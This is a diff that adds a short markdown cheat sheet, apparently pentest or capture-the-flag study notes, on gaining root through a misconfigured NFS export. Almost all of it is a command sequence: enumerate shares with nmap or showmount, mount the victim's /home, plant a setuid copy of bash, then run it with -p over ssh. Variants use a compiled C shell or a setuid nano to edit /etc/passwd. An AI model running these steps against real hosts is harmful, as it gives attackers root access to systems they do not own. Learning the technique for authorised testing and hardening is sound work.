@@ -1,0 +1,31 @@
+# Privilege Escalation using misconfigured NFS
+Port 111 and Port 2049 should be opened.
+1. nmap -sV --script=nfs-showmount victim IP ADDRESS
+
+              OR
+
+    showmount -e IP ADDRESS
+
+2. for privilege escalation do the following on Kali m/c
+
+  1. mkdir /tmp/abc
+  2. mount -t nfs victim IP ADDRESS:/home /tmp/abc
+  3. cd /tmp/abc
+  4. cp /bin/bash .
+  5. chmod +s bash
+  6. ls -la bash
+  7. Now to check - df -h and see our mounted directory
+
+3. Now ssh into victim machine -
+  1. cd /home
+  2. ls -la
+  3. You should see 'bash' which we created
+  4. Run ./bash -p
+  5. We should have a root shell!
+
+A.  Instead of copying /bin/bash in 2 we can do the same by creating a binary called
+  "shell" made by a C script and then do the same.
+B.  Can also use nano editor the same way giving it 4777 privileges and then loading up
+/etc/passwd in it but remember -p flag!
+
+NOTE : -p flag is extremely important!
